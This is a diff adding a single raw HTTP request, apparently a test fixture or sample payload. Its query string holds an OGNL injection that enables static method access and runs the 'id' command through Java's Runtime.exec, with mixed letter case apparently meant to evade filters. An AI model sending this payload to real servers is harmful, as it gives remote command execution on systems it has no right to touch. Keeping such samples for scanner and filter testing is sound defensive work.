@@ -1,0 +1,4 @@
+GET /a?s=%{%23_mEmBeRaCcEsS['aLlOwStAtIcMeThOdAcCeSs']%3DTrUe,@JaVa.LaNg.RuNtImE@gEtRuNtImE().eXeC('iD')} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
